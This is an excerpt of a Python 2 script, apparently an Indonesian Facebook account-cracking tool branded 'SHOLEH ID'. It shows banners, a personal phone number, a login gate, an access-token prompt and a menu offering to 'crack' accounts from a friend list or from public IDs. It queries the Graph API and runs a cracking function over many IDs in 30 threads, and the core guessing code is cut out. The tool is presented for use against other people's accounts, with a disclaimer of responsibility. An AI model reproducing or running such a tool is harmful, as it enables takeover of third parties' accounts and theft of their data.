...
╚════╝╚════╝╚════╝╚════╝
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤═══════════║
\033[1;96m║✯ Creator «» SHOLEH ID 
\033[1;98m║✯ WhatsApp«» 081236881601
\033[1;96m║✯ Selamat Datang..
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════¤══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
print  """
\033[1;97m═════════════════════════════════════════════
\033[1;96m  «» SAYA TIDAK BERTANGGUNG JAWAB «»
\033[1;96m    «» MENGGUNAKAN SC ini COK..! «»
\033[1;97m═════════════════════════════════════════════
...
▒█▀▀▄ ▒█▀▀▀ 　 ▒█▀▀▀ ▒█▒█▒█ ░▄░▒█ ▒█░░▒█ ▒█▄▄▄█ 
▒█▄▄█ ▒█▄▄▄ 　 ▒█▄▄▄ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄█ ░░▒█░░
\033[1;97mFANTASTIC-2021
"""

CorrectUsername = "FANTASTIC"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Benar " + username #Dev:SHOLEH ID
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96msalah"
            os.system('xdg-open https://www.facebook.com/morena.sumba')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://www.facebook.com/more')

def login():
    os.system('clear')
    print logo
    print
    jalan("\033[0;95m«»Anda Harus Login Dulu Boss«»") 
    jalan("\033[1;91mLogin Menggunakan Token !!!")
    toket = raw_input('\x1b[0;39m[\x1b[0;39m?\x1b[0;39m] \x1b[1;36mToken ➣ \x1b[0;39m')
    try:
...
def super():
	...
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95mCrack Dari Daftar Teman."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95mCrack Dari ID Teman/Publik ."
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mSHOLEH ID\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mSHOLEH HACKERS\033[1;95m◈•══════•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mNama\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Tdk Ada"
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mSHOLEH ID33[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By FANTASTIC--•◈•---»" #Dev:BE HAPPY BE ENJOY
...
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..Sholeh Fantastic.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91mShahrukh22"""
